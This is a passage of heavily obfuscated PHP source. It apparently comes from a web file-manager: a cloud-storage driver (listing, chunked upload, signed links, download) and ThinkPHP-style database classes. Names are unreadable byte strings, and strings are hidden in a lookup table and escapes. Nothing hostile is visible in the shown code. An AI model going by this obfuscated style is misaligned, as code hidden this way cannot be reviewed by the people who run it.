$î„¸†£Ò[$ÍßñŒ¬¨[1557]]); $this->cacheMethodInfoSet($¦ûäÑï©, $‘¨£´È¨, $³À¯Çª); if ($‘¨£´È¨) { $¤³¹Ù¯š[] = $¦ûäÑï©; if ($Ö¶Ãî°ù) { $this->fileList($¦ûäÑï©, $¤³¹Ù¯š, $œ³ÍÁÒ, $Ö¶Ãî°ù); } continue; } $œ³ÍÁÒ[] = $³À¯Çª; } if (count($¼¥¼‰ş¶) < $‘’¼Ş«‰) { break; } } $this->cacheMethodInfoSet($â¦ŞŞí¸, !0); } public function listPath($¼å¨ÀÜÎ, $õîó¿˜Ÿ = false) { $òÙÎ¥¶Õ =& $_SERVER[£ğ°ÖØø]; $ğ°Óââø = $Û×º¥Ç… = array(); $this->fileList($¼å¨ÀÜÎ, $ğ°Óââø, $Û×º¥Ç…); foreach ($ğ°Óââø as $ …“·¾§ => $½áœƒ²¥) { $ğ°Óââø[$ …“·¾§] = $this->folderInfo($½áœƒ²¥, $õîó¿˜Ÿ); } foreach ($Û×º¥Ç… as $ …“·¾§ => $½áœƒ²¥) { $Û×º¥Ç…[$ …“·¾§] = $this->fileInfo($½áœƒ²¥[$òÙÎ¥¶Õ[32]], $õîó¿˜Ÿ, $½áœƒ²¥); } return array($òÙÎ¥¶Õ[85] => $ğ°Óââø, $òÙÎ¥¶Õ[86] => $Û×º¥Ç…); } public function has($ˆ¦ î›½, $Ô¥³†›ì = false, $ÔüÑƒù = true) { $»Şõ”§ø =& $_SERVER[£ğ°ÖØø]; $¶ØÀÃ¯ü = $»Şõ”§ø[12]; $«ŠºÄ­Â = 500; $É‘Ô¢çÌ = 0; $àãèöš‘ = 0; $ıËæãîº = rtrim($ˆ¦ î›½, $»Şõ”§ø[8]) . $»Şõ”§ø[8]; while (!0) { check_abort(); $Ä°ÔŸ÷¶ = $this->listObjs($ˆ¦ î›½, $¶ØÀÃ¯ü, $«ŠºÄ­Â); if (!$Ä°ÔŸ÷¶) { return !1; } $¶ØÀÃ¯ü = isset($Ä°ÔŸ÷¶[$»Şõ”§ø[1555]]) ? $Ä°ÔŸ÷¶[$»Şõ”§ø[1555]] : $»Şõ”§ø[12]; $ƒ´É„’ = isset($Ä°ÔŸ÷¶[$»Şõ”§ø[1556]]) ? $Ä°ÔŸ÷¶[$»Şõ”§ø[1556]] : array(); if (empty($ƒ´É„’)) { break; } $À³ı¡– = array_filter($ƒ´É„’, function ($·’¶Íúó) { $šÕïòÅ» =& $_SERVER[£ğ°ÖØø]; return $·’¶Íúó[$šÕïòÅ»[33]] == $šÕïòÅ»[78]; }); $¿¼ÇŞµü = count($ƒ´É„’); $À³ı¡– = count($À³ı¡–); $¬¬à»áİ = $¿¼ÇŞµü - $À³ı¡–; if ($Ô¥³†›ì) { $àãèöš‘ += $À³ı¡–; $É‘Ô¢çÌ += $¬¬à»áİ; if ($¿¼ÇŞµü < $«ŠºÄ­Â) { break; } continue; } if ($ÔüÑƒù) { if ($¬¬à»áİ) { return !0; } } else { if ($À³ı¡–) { return !0; } } if ($¿¼ÇŞµü < $«ŠºÄ­Â) { break; } } if ($Ô¥³†›ì) { return array($»Şõ”§ø[239] => $É‘Ô¢çÌ, $»Şõ”§ø[240] => $àãèöš‘); } return !1; } public function listAll($î˜ö¹°Ù) { $ÒÕö¢¬µ =& $_SERVER[£ğ°ÖØø]; $“‘ÚäÑ = $Ê‰‘õ³¿ = array(); $this->fileList($î˜ö¹°Ù, $“‘ÚäÑ, $Ê‰‘õ³¿, !0); $ûØæÒ³ƒ = array_to_keyvalue($Ê‰‘õ³¿, $ÒÕö¢¬µ[32]); foreach ($“‘ÚäÑ as $Öşôî¦¨) { if (is_string($Öşôî¦¨)) { $ûØæÒ³ƒ[$Öşôî¦¨] = array($ÒÕö¢¬µ[79] => 0); } } return $this->listAllFiles($î˜ö¹°Ù, $ûØæÒ³ƒ); } public function canRead($âıöàˆË) { return $this->exist($âıöàˆË) ? !0 : !1; } public function canWrite($Ö¥¼Şğ) { return $this->exist($Ö¥¼Şğ) ? !0 : !1; } public function getContent($¥’†û¹) { return $this->fileSubstr($¥’†û¹, 0, -1); } public function setContent($æÆ˜ÌÃ×, $²ëèà€” = '') { $ºğòÇı– =& $_SERVER[£ğ°ÖØø]; if (!$²ëèà€”) { $šŒĞì€† = $this->ussRequest($æÆ˜ÌÃ×, $ºğòÇı–[257]); return $šŒĞì€†[$ºğòÇı–[1280]]; } $Ã®¡ŠŸ = $this->tempFile($this->pathThis($æÆ˜ÌÃ×)); file_put_contents($Ã®¡ŠŸ, $²ëèà€”); if ($this->upload($æÆ˜ÌÃ×, $Ã®¡ŠŸ)) { $this->tempFileRemve($Ã®¡ŠŸ); return !0; } return !1; } public function fileSubstr($£’ÎÃÉ³, $è ë¸öœ, $¥¡Û£ì) { $Ã˜²·ì‚ =& $_SERVER[£ğ°ÖØø]; if (!($Â¼İ‹·° = $this->link($£’ÎÃÉ³))) { return !1; } $ö«¦äØØ = !1; if ($¥¡Û£ì > 0) { $Ø‹ÁŒ†À = $è ë¸öœ + $¥¡Û£ì - 1; $ö«¦äØØ = array($Ã˜²·ì‚[1516] . $è ë¸öœ . $Ã˜²·ì‚[471] . $Ø‹ÁŒ†À); } $¾ˆ’²¼è = url_request($Â¼İ‹·°, $Ã˜²·ì‚[261], !1, $ö«¦äØØ); return $¾ˆ’²¼è[$Ã˜²·ì‚[814]] ? $¾ˆ’²¼è[$Ã˜²·ì‚[1270]] : !1; } public function upload($²õÆ¢×, $¶·¬±¥“, $ƒ•ÊÁø = false, $æ›óéªÌ = REPEAT_REPLACE) { $ìà „½ =& $_SERVER[£ğ°ÖØø]; $îÎï›Ú = IO::size($¶·¬±¥“); if ($îÎï›Ú <= 1024 * 1024 * 200) { $æ×ÓûÆø = array($ìà „½[1558] . $¶·¬±¥“); $Ú®°Õíœ = $this->ussRequest($²õÆ¢×, $ìà „½[259], $æ×ÓûÆø); return $Ú®°Õíœ[$ìà „½[1280]] ? $this->getPathOuter($²õÆ¢×) : !1; } $à™ØšÙÔ = 1024 * 1024 * 10; $øùÙôâç = array($ìà „½[1559], $ìà „½[1560] . $îÎï›Ú, $ìà „½[1561], $ìà „½[1562] . $à™ØšÙÔ); $Ú®°Õíœ = $this->ussRequest($²õÆ¢×, $ìà „½[259], !1, $øùÙôâç); if (!$Ú®°Õíœ[$ìà „½[1280]]) { return !1; } $‚­Â¾ñ” = $Ú®°Õíœ[$ìà „½[1270]]; $ÎÒ®²Õ = 0; $ÃŒÒ‚¡– = $‚­Â¾ñ”[$ìà „½[1563]]; $¦üë¿Ìİ = fopen($¶·¬±¥“, $ìà „½[1439]); if (!$¦üë¿Ìİ) { return !1; } do { $®ñœÄ¨õ = $‚­Â¾ñ”[$ìà „½[1564]]; fseek_64($¦üë¿Ìİ, $ÎÒ®²Õ); $ÇŞ˜ğäì = fread($¦üë¿Ìİ, $®ñœÄ¨õ); $ñ­öóŸ = 0; do { $ñ­öóŸ++; $‚­Â¾ñ” = $this->uploadPart($²õÆ¢×, $‚­Â¾ñ”, $ÇŞ˜ğäì); } while (!$‚­Â¾ñ” && $ñ­öóŸ < 3); if (!$‚­Â¾ñ”) { return !1; } $ÃŒÒ‚¡– = $‚­Â¾ñ”[$ìà „½[1563]]; $ÎÒ®²Õ += $®ñœÄ¨õ; } while ($ÃŒÒ‚¡– != -1); fclose($¦üë¿Ìİ); $øùÙôâç = array($ìà „½[1565], $ìà „½[1566] . $‚­Â¾ñ”[$ìà „½[1567]], $ìà „½[1561]); $Ú®°Õíœ = $this->ussRequest($²õÆ¢×, $ìà „½[259], !1, $øùÙôâç); return $Ú®°Õíœ[$ìà „½[1280]] ? $this->getPathOuter($¨÷ÀÎÓé) : !1; } private function uploadPart($†üÎÈÆ¦, $ûÔ”›ò, &$ÅÙ…¨òÑ) { $á‹÷–³ª =& $_SERVER[£ğ°ÖØø]; $†·î¹ùò = array($á‹÷–³ª[1568], $á‹÷–³ª[1566] . $ûÔ”›ò[$á‹÷–³ª[1567]], $á‹÷–³ª[1569] . $ûÔ”›ò[$á‹÷–³ª[1563]], $á‹÷–³ª[146] . $ûÔ”›ò[$á‹÷–³ª[1564]]); $¼‘Ã¬¼Û = $this->ussRequest($†üÎÈÆ¦, $á‹÷–³ª[259], $ÅÙ…¨òÑ, $†·î¹ùò); return !$¼‘Ã¬¼Û[$á‹÷–³ª[1280]] ? $¼‘Ã¬¼Û[$á‹÷–³ª[1280]] : $¼‘Ã¬¼Û[$á‹÷–³ª[1270]]; } public function uploadFormData($ÃØë‚»¤, $ü‹ı·°¿ = 3600) { return $this->uploadPolicy($ÃØë‚»¤, $ü‹ı·°¿); } public function multiUploadFormData($ÍçğÀò×, $ÉÀÆŠ = 3600) { $«„ŠÚØØ =& $_SERVER[£ğ°ÖØø]; $¦¬°³§§ = (int) $GLOBALS[$«„ŠÚØØ[7]][$«„ŠÚØØ[79]]; return $this->uploadPolicy($ÍçğÀò×, $ÉÀÆŠ, $¦¬°³§§); } private function uploadPolicy($ñ’ÂÉ½’, $†õ†¡¤ã = 3600, $’‰â¨‰ = 0) { $³ìê®’á =& $_SERVER[£ğ°ÖØø]; $ñÎïÑ— = $³ìê®’á[8] . $this->bucket; $Ê«ŠäÂÛ = gmdate($³ìê®’á[1474]); $—ÇÒô¦¬ = array($³ìê®’á[1570] => $this->bucket, $³ìê®’á[1571] => $ñ’ÂÉ½’, $³ìê®’á[1572] => time() + $†õ†¡¤ã, $³ìê®’á[1573] => $Ê«ŠäÂÛ); if ($’‰â¨‰) { $—ÇÒô¦¬[$³ìê®’á[1459]] = $’‰â¨‰; } $ñÔ»şÃÏ = base64_encode(json_encode($—ÇÒô¦¬)); $õŞÁöÊ÷ = base64_encode(hash_hmac($³ìê®’á[1527], "\x50\x4f\123\124\x26{$ñÎïÑ—}\46{$Ê«ŠäÂÛ}\46{$ñÔ»şÃÏ}", md5("{$this->userpass}"), !0)); $È„ï«â‡ = array($³ìê®’á[293] => $ñÔ»şÃÏ, $³ìê®’á[1574] => "\x55\x50\x59\125\116\40{$this->username}\x3a{$õŞÁöÊ÷}", $³ìê®’á[208] => $this->endpoint . $ñÎïÑ—); return $È„ï«â‡; } public function download($ñ«š£¥Ù, $§Â¨÷æË) { $ü¦ˆ™¦® = IO::getPathInner(IO::mkfile($§Â¨÷æË)); if (!($ü¦½Ì¤â = $this->link($ñ«š£¥Ù))) { return !1; } $ñé˜ò±ì = 0; $ñğ•Ñ© = 1024 * 200; $£¿”™ˆâ = fopen($ü¦ˆ™¦®, $_SERVER[£ğ°ÖØø][1522]); while (!0) { $ş†»¼† = $this->fileSubstr($ñ«š£¥Ù, $ñé˜ò±ì, $ñğ•Ñ©); if ($ş†»¼† === !1) { return !1; } fwrite($£¿”™ˆâ, $ş†»¼†); $ñé˜ò±ì += $ñğ•Ñ©; if (strlen($ş†»¼†) < $ñğ•Ñ©) { break; } } fclose($£¿”™ˆâ); return $§Â¨÷æË; } public function link($Åí™ó›, $é¯¡‡û = array()) { $†¾Šİ¼Ü =& $_SERVER[£ğ°ÖØø]; $Åí™ó› = trim($Åí™ó›, $†¾Šİ¼Ü[8]); if (!empty($this->token)) { $Ş·ä³‰¡ = strtotime(date($†¾Šİ¼Ü[1575])); $Ï¯ûşŞ„ = substr(md5($this->token . $†¾Šİ¼Ü[360] . $Ş·ä³‰¡ . $†¾Šİ¼Ü[1576] . $Åí™ó›), 12, 8) . $Ş·ä³‰¡; $é¯¡‡û[] = $†¾Šİ¼Ü[1577] . $Ï¯ûşŞ„; } $Ğ”‡ı† = !empty($é¯¡‡û) ? $†¾Šİ¼Ü[76] . implode($†¾Šİ¼Ü[360], $é¯¡‡û) : $†¾Šİ¼Ü[12]; return $this->getHost() . $†¾Šİ¼Ü[8] . $Åí™ó› . $Ğ”‡ı†; } public function fileOut($²éüÕÓœ, $ññ•ãº‚ = false, $‰³—§ò… = false, $Óùñ´õ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($²éüÕÓœ, $ññ•ãº‚, $‰³—§ò…, $Óùñ´õ); } if (!$‰³—§ò…) { $‰³—§ò… = $this->pathThis($²éüÕÓœ); } $Ä—İƒÔ = $ññ•ãº‚ ? array($_SERVER[£ğ°ÖØø][1578] . rawurlencode($‰³—§ò…)) : array(); $üùúŠö· = $this->link($²éüÕÓœ, $Ä—İƒÔ); $this->fileOutLink($üùúŠö·); } public function fileOutServer($ÉÂ†¼ò, $­­ìñº“ = false, $äĞíÚ = false, $‡âô¶±¥ = '') { parent::fileOut($ÉÂ†¼ò, $­­ìñº“, $äĞíÚ, $‡âô¶±¥); } public function fileOutImage($ß‰ó–ßÃ, $ğõ¬Ñ·· = 250) { $ÈÌ€¶¢” = $this->link($ß‰ó–ßÃ . $_SERVER[£ğ°ÖØø][1579] . $ğõ¬Ñ··); $this->fileOutLink($ÈÌ€¶¢”); } public function fileOutImageServer($ã“ˆœÔİ, $ü×ËÈÔá = 250) { parent::fileOutImage($ã“ˆœÔİ, $ü×ËÈÔá); } public function hashMd5($ó„²ûæí) { $§öâ”ï– =& $_SERVER[£ğ°ÖØø]; $ß¨æÀû½ = $this->_objectMeta($ó„²ûæí); return isset($ß¨æÀû½[$§öâ”ï–[245]]) ? $ß¨æÀû½[$§öâ”ï–[245]] : !1; } public function size($ëÃÓ¡Û¥) { $Ò¾†Øóğ = $this->objectMeta($ëÃÓ¡Û¥); return $Ò¾†Øóğ ? $Ò¾†Øóğ[$_SERVER[£ğ°ÖØø][79]] : 0; } public function info($´åñ¥Æ) { if ($this->isFolder($´åñ¥Æ)) { return $this->folderInfo($´åñ¥Æ); } else { if ($this->isFile($´åñ¥Æ)) { return $this->fileInfo($´åñ¥Æ); } } return !1; } public function exist($è‚›Âµ­) { return $this->isFile($è‚›Âµ­) || $this->isFolder($è‚›Âµ­); } public function isFile($Ç¥†Ï³Ú) { return !$this->isFolder($Ç¥†Ï³Ú) && $this->objectMeta($Ç¥†Ï³Ú); } public function isFolder($·–Ê‹†•) { return $this->cacheMethod($_SERVER[£ğ°ÖØø][179], $·–Ê‹†•); } protected function objectMeta($û€™›¹Ò) { return $this->cacheMethod($_SERVER[£ğ°ÖØø][181], $û€™›¹Ò); } protected function _objectMeta($íşùÏ™) { $ö¡ó¬Ô¨ =& $_SERVER[£ğ°ÖØø]; if ($íşùÏ™ == $ö¡ó¬Ô¨[12] || $íşùÏ™ == $ö¡ó¬Ô¨[8]) { return array(); } $¥ğÍ²ÓÆ = $this->ussRequest($íşùÏ™, $ö¡ó¬Ô¨[1580]); if (!$¥ğÍ²ÓÆ[$ö¡ó¬Ô¨[1280]]) { return null; } $—´î¶Üò = isset($¥ğÍ²ÓÆ[$ö¡ó¬Ô¨[1270]]) ? $¥ğÍ²ÓÆ[$ö¡ó¬Ô¨[1270]] : array(); if (!isset($—´î¶Üò[$ö¡ó¬Ô¨[1581]])) { return null; } $¨Ï×‡¼¬ = array($ö¡ó¬Ô¨[33] => isset($—´î¶Üò[$ö¡ó¬Ô¨[1581]]) ? $—´î¶Üò[$ö¡ó¬Ô¨[1581]] : null, $ö¡ó¬Ô¨[79] => isset($—´î¶Üò[$ö¡ó¬Ô¨[1582]]) ? $—´î¶Üò[$ö¡ó¬Ô¨[1582]] : null, $ö¡ó¬Ô¨[245] => isset($—´î¶Üò[$ö¡ó¬Ô¨[1583]]) ? $—´î¶Üò[$ö¡ó¬Ô¨[1583]] : null, $ö¡ó¬Ô¨[1550] => isset($—´î¶Üò[$ö¡ó¬Ô¨[1584]]) ? $—´î¶Üò[$ö¡ó¬Ô¨[1584]] : null); $¨Ï×‡¼¬[$ö¡ó¬Ô¨[1551]] = isset($—´î¶Üò[$ö¡ó¬Ô¨[1585]]) ? strtotime($—´î¶Üò[$ö¡ó¬Ô¨[1585]]) : $¨Ï×‡¼¬[$ö¡ó¬Ô¨[1550]]; return $¨Ï×‡¼¬; } protected function _isFolder($¾­Ä“Ê™) { $¼«Íõó» =& $_SERVER[£ğ°ÖØø]; if ($¾­Ä“Ê™ == $¼«Íõó»[12] || $¾­Ä“Ê™ == $¼«Íõó»[8]) { return !0; } $àôğ„Ã® = $this->_objectMeta($¾­Ä“Ê™); return isset($àôğ„Ã®[$¼«Íõó»[33]]) && $àôğ„Ã®[$¼«Íõó»[33]] == $¼«Íõó»[78] ? !0 : !1; } } goto Eğ„¹Ù¥¡…; BœÁ³“ìùÚ: class DbSqlite extends DbSqliteBase { public function query($£ĞÇÔÚ€) { $ÀõÏ™ó½ =& $_SERVER[£ğ°ÖØø]; if (!CacheLock::fileLock($ÀõÏ™ó½[13])) { return !1; } $¸æ¯Á·Î = parent::query($£ĞÇÔÚ€); CacheLock::fileUnLock($ÀõÏ™ó½[13]); return $¸æ¯Á·Î; } public function execute($ÂÎ­Áƒ±) { $‹å€åÜ =& $_SERVER[£ğ°ÖØø]; if (!CacheLock::fileLock($‹å€åÜ[13])) { return !1; } $Ú©¤²ñÑ = parent::execute($ÂÎ­Áƒ±); CacheLock::fileUnLock($‹å€åÜ[13]); return $Ú©¤²ñÑ; } } class DbSqlite3 extends DbSqlite3Base { public function query($§âİÑñ) { $ñı’…ğÃ =& $_SERVER[£ğ°ÖØø]; if (!CacheLock::fileLock($ñı’…ğÃ[13])) { return !1; } $í¦ïÆ‡® = parent::query($§âİÑñ); CacheLock::fileUnLock($ñı’…ğÃ[13]); return $í¦ïÆ‡®; } public function execute($ÄÂÔ§Ó„) { $ö²ôŸÜ˜ =& $_SERVER[£ğ°ÖØø]; if (!CacheLock::fileLock($ö²ôŸÜ˜[13])) { return !1; } $„Æ±Àï† = parent::execute($ÄÂÔ§Ó„); CacheLock::fileUnLock($ö²ôŸÜ˜[13]); return $„Æ±Àï†; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\x74\150\x69\x6e\x6b\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\161" => "\75", "\156\x65\x71" => "\74\76", "\x67\164" => "\x3e", "\x65\x67\x74" => "\x3e\75", "\x6c\164" => "\x3c", "\x65\x6c\164" => "\x3c\75", "\x6e\x6f\164\154\151\153\145" => "\x4e\117\124\x20\114\111\113\x45", "\154\151\153\x65" => "\114\x49\x4b\x45", "\151\156" => "\111\x4e", "\x6e\x6f\164\151\156" => "\116\117\124\40\x49\116", "\156\x6f\x74\x20\x69\x6e" => "\x4e\117\x54\40\x49\x4e", "\x62\145\x74\167\145\145\156" => "\x42\105\x54\x57\105\x45\116", "\x6e\x6f\164\142\145\x74\167\145\145\x6e" => "\116\117\124\40\102\x45\x54\127\x45\x45\116", "\x6e\x6f\x74\40\x62\145\164\x77\145\145\156" => "\x4e\x4f\124\40\102\105\x54\127\105\x45\116"); protected $selectSql = "\123\x45\114\x45\x43\x54\x25\x44\x49\x53\124\x49\x4e\103\x54\x25\40\x25\106\x49\x45\x4c\104\45\40\106\122\x4f\x4d\x20\45\x54\x41\x42\114\105\45\x25\x4a\117\x49\116\x25\x25\x57\110\105\122\x45\45\45\x47\122\117\x55\x50\x25\45\x48\101\x56\111\x4e\107\x25\45\x4f\122\x44\105\122\45\x25\114\111\x4d\111\x54\45\40\45\x55\x4e\x49\x4f\116\x25\x25\x43\117\x4d\115\105\x4e\x54\x25"; protected $bind = array(); public static function getInstance() { $ğˆñÍÆ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[£ğ°ÖØø][1021], $ğˆñÍÆ); } public function factory($æ„Ë± = '') { $ÚÊöŸ–Ü =& $_SERVER[£ğ°ÖØø]; $æ„Ë± = $this->parseConfig($æ„Ë±); if (empty($æ„Ë±[$ÚÊöŸ–Ü[1022]])) { think_exception(think_lang($ÚÊöŸ–Ü[1023])); } $this->dbType = ucwords(strtolower($æ„Ë±[$ÚÊöŸ–Ü[1022]])); $µ¢å¥‘Í = $ÚÊöŸ–Ü[1024] . $this->dbType; if (class_exists($µ¢å¥‘Í)) { $®Şû¸«Š = new $µ¢å¥‘Í($æ„Ë±); if ($ÚÊöŸ–Ü[1025] != strtolower($æ„Ë±[$ÚÊöŸ–Ü[1022]])) { $®Şû¸«Š->dbType = strtoupper($this->dbType); } else { $®Şû¸«Š->dbType = $this->_getDsnType($æ„Ë±[$ÚÊöŸ–Ü[977]]); } } else { think_exception(think_lang($ÚÊöŸ–Ü[1026]) . $ÚÊöŸ–Ü[1027] . $µ¢å¥‘Í); } return $®Şû¸«Š; } public function __call($äé‚œ¨, $¦˜ÕĞ§) { if (method_exists($this, $äé‚œ¨)) { return call_user_func_array(array($this, $äé‚œ¨), $¦˜ÕĞ§); } } protected function _getDsnType($Îáââ”«) { $Í¾êØõÃ = explode($_SERVER[£ğ°ÖØø][4], $Îáââ”«); $ËÚÏàÄ­ = strtoupper(trim($Í¾êØõÃ[0])); return $ËÚÏàÄ­; } private function parseConfig($ºäÆàíĞ = '') { $ıé¹ûú½ =& $_SERVER[£ğ°ÖØø]; if (!empty($ºäÆàíĞ) && is_string($ºäÆàíĞ)) { $ºäÆàíĞ = $this->parseDSN($ºäÆàíĞ); } elseif (is_array($ºäÆàíĞ)) { $ºäÆàíĞ = array_change_key_case($ºäÆàíĞ); $ºäÆàíĞ = array($ıé¹ûú½[1022] => $ºäÆàíĞ[$ıé¹ûú½[1028]], $ıé¹ûú½[949] => $ºäÆàíĞ[$ıé¹ûú½[1029]], $ıé¹ûú½[950] => $ºäÆàíĞ[$ıé¹ûú½[1030]], $ıé¹ûú½[947] => $ºäÆàíĞ[$ıé¹ûú½[1031]], $ıé¹ûú½[948] => $ºäÆàíĞ[$ıé¹ûú½[1032]], $ıé¹ûú½[21] => $ºäÆàíĞ[$ıé¹ûú½[1033]], $ıé¹ûú½[977] => $ºäÆàíĞ[$ıé¹ûú½[1034]], $ıé¹ûú½[17] => isset($ºäÆàíĞ[$ıé¹ûú½[1035]]) ? $ºäÆàíĞ[$ıé¹ûú½[1035]] : array()); } elseif (empty($ºäÆàíĞ)) { if (think_config($ıé¹ûú½[1036]) && $ıé¹ûú½[1025] != strtolower(think_config($ıé¹ûú½[1037]))) { $ºäÆàíĞ = $this->parseDSN(think_config($ıé¹ûú½[1036])); } else { $ºäÆàíĞ = array($ıé¹ûú½[1022] => think_config($ıé¹ûú½[1037]), $ıé¹ûú½[949] => think_config($ıé¹ûú½[1038]), $ıé¹ûú½[950] => think_config($ıé¹ûú½[1039]), $ıé¹ûú½[947] => think_config($ıé¹ûú½[1040]), $ıé¹ûú½[948] => think_config($ıé¹ûú½[1041]), $ıé¹ûú½[21] => think_config($ıé¹ûú½[323]), $ıé¹ûú½[977] => think_config($ıé¹ûú½[1036]), $ıé¹ûú½[17] => think_config($ıé¹ûú½[1042])); } } return $ºäÆàíĞ; } protected function initConnect($³í¦ä˜» = true) { if (1 == think_config($_SERVER[£ğ°ÖØø][22])) { $this->_linkID = $this->multiConnect($³í¦ä˜»); } else { if (isset($this->config) && $this->config) { $this->configLast = $this->config; } } if (!isset($this->connected) || !$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $ù‚’«âá => $ ØõğıÉ) { $this->_linkID = $ ØõğıÉ; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($å¦·óÓÔ = false) { $®†¢úŒè =& $_SERVER[£ğ°ÖØø]; static $—ÌÈ²÷¼ = array(); static $ÑœÅ×‹– = -1; if (empty($—ÌÈ²÷¼)) { foreach ($this->config as $üşàŞ’ => $òèŠò‡) { $—ÌÈ²÷¼[$üşàŞ’] = explode($®†¢úŒè[50], $òèŠò‡); } } if (think_config($®†¢úŒè[1043])) { if ($å¦·óÓÔ || think_config($®†¢úŒè[480]) === !0) { $ÍÎ¦à†§ = floor(mt_rand(0, think_config($®†¢úŒè[1044]) - 1)); $ÑœÅ×‹– = $ÍÎ¦à†§; } else { if (is_numeric(think_config($®†¢úŒè[1045]))) { $ÍÎ¦à†§ = think_config($®†¢úŒè[1045]); } else { $ÍÎ¦à†§ = floor(mt_rand(think_config($®†¢úŒè[1044]), count($—ÌÈ²÷¼[$®†¢úŒè[947]]) - 1)); } } } else { $ÍÎ¦à†§ = floor(mt_rand(0, count($—ÌÈ²÷¼[$®†¢úŒè[947]]) - 1)); $ÑœÅ×‹– = $ÍÎ¦à†§; } $ÍÎ¦à†§ = $ÑœÅ×‹– !== -1 ? $ÑœÅ×‹– : $ÍÎ¦à†§; $·ÊŠ°‘¶ = array($®†¢úŒè[949] => isset($—ÌÈ²÷¼[$®†¢úŒè[949]][$ÍÎ¦à†§]) ? $—ÌÈ²÷¼[$®†¢úŒè[949]][$ÍÎ¦à†§] : $—ÌÈ²÷¼[$®†¢úŒè[949]][0], $®†¢úŒè[950] => isset($—ÌÈ²÷¼[$®†¢úŒè[950]][$ÍÎ¦à†§]) ? $—ÌÈ²÷¼[$®†¢úŒè[950]][$ÍÎ¦à†§] : $—ÌÈ²÷¼[$®†¢úŒè[950]][0], $®†¢úŒè[947] => isset($—ÌÈ²÷¼[$®†¢úŒè[947]][$ÍÎ¦à†§]) ? $—ÌÈ²÷¼[$®†¢úŒè[947]][$ÍÎ¦à†§] : $—ÌÈ²÷¼[$®†¢úŒè[947]][0], $®†¢úŒè[948] => isset($—ÌÈ²÷¼[$®†¢úŒè[948]][$ÍÎ¦à†§]) ? $—ÌÈ²÷¼[$®†¢úŒè[948]][$ÍÎ¦à†§] : $—ÌÈ²÷¼[$®†¢úŒè[948]][0], $®†¢úŒè[21] => isset($—ÌÈ²÷¼[$®†¢úŒè[21]][$ÍÎ¦à†§]) ? $—ÌÈ²÷¼[$®†¢úŒè[21]][$ÍÎ¦à†§] : $—ÌÈ²÷¼[$®†¢úŒè[21]][0], $®†¢úŒè[977] => isset($—ÌÈ²÷¼[$®†¢úŒè[977]][$ÍÎ¦à†§]) ? $—ÌÈ²÷¼[$®†¢úŒè[977]][$ÍÎ¦à†§] : $—ÌÈ²÷¼[$®†¢úŒè[977]][0], $®†¢úŒè[17] => isset($—ÌÈ²÷¼[$®†¢úŒè[17]][$ÍÎ¦à†§]) ? $—ÌÈ²÷¼[$®†¢úŒè[17]][$ÍÎ¦à†§] : $—ÌÈ²÷¼[$®†¢úŒè[17]][0]); return $this->connect($·ÊŠ°‘¶, $ÍÎ¦à†§); } public function parseDSN($ï—Û×Æ) { $¯ë÷†Ğ =& $_SERVER[£ğ°ÖØø]; if (empty($ï—Û×Æ)) { return !1; } $’‰Ó€’ò = parse_url($ï—Û×Æ); if ($’‰Ó€’ò[$¯ë÷†Ğ[207]]) { $²ö¦Á® = array($¯ë÷†Ğ[1022] => $’‰Ó€’ò[$¯ë÷†Ğ[207]], $¯ë÷†Ğ[949] => isset($’‰Ó€’ò[$¯ë÷†Ğ[671]]) ? $’‰Ó€’ò[$¯ë÷†Ğ[671]] : $¯ë÷†Ğ[12], $¯ë÷†Ğ[950] => isset($’‰Ó€’ò[$¯ë÷†Ğ[1046]]) ? $’‰Ó€’ò[$¯ë÷†Ğ[1046]] : $¯ë÷†Ğ[12], $¯ë÷†Ğ[947] => isset($’‰Ó€’ò[$¯ë÷†Ğ[208]]) ? $’‰Ó€’ò[$¯ë÷†Ğ[208]] : $¯ë÷†Ğ[12], $¯ë÷†Ğ[948] => isset($’‰Ó€’ò[$¯ë÷†Ğ[209]]) ? $’‰Ó€’ò[$¯ë÷†Ğ[209]] : $¯ë÷†Ğ[12], $¯ë÷†Ğ[21] => isset($’‰Ó€’ò[$¯ë÷†Ğ[87]]) ? substr($’‰Ó€’ò[$¯ë÷†Ğ[87]], 1) : $¯ë÷†Ğ[12]); } else { preg_match($¯ë÷†Ğ[1047], trim($ï—Û×Æ), $î’À•ÉË); $²ö¦Á® = array($¯ë÷†Ğ[1022] => $î’À•ÉË[1], $¯ë÷†Ğ[949] => $î’À•ÉË[2], $¯ë÷†Ğ[950] => $î’À•ÉË[3], $¯ë÷†Ğ[947] => $î’À•ÉË[4], $¯ë÷†Ğ[948] => $î’À•ÉË[5], $¯ë÷†Ğ[21] => $î’À•ÉË[6]); } $²ö¦Á®[$¯ë÷†Ğ[977]] = $¯ë÷†Ğ[12]; return $²ö¦Á®; } protected function debug() { $ü¬É =& $_SERVER[£ğ°ÖØø]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $ü¬É[1048]; if (think_config($ü¬É[1049])) { think_status($ü¬É[1050]); think_trace($this->queryStr . $ü¬É[1051] . think_status($ü¬É[24], $ü¬É[1050], 6) . $ü¬É[1052], $ü¬É[12], $ü¬É[1053]); } } protected function parseLock($ÖşıáÛë = false) { $Áû´ü ˆ =& $_SERVER[£ğ°ÖØø]; if (!$ÖşıáÛë) { return $Áû´ü ˆ[12]; } if ($Áû´ü ˆ[979] == $this->dbType) { return $Áû´ü ˆ[1054]; } return $Áû´ü ˆ[1055]; } protected function parseSet($º³ÎşÆ†) { $ş’øªğ =& $_SERVER[£ğ°ÖØø]; foreach ($º³ÎşÆ† as $ú¼ÈÏñ => $‰«¬Œ) { if (is_array($‰«¬Œ) && $ş’øªğ[373] == $‰«¬Œ[0]) { $Íøö´Ã[] = $this->parseKey($ú¼ÈÏñ) . $ş’øªğ[945] . $‰«¬Œ[1]; } elseif (is_scalar($‰«¬Œ) || is_null($‰«¬Œ)) { $Íøö´Ã[] = $this->parseKey($ú¼ÈÏñ) . $ş’øªğ[945] . $this->parseValue($‰«¬Œ); } } return $ş’øªğ[1056] . 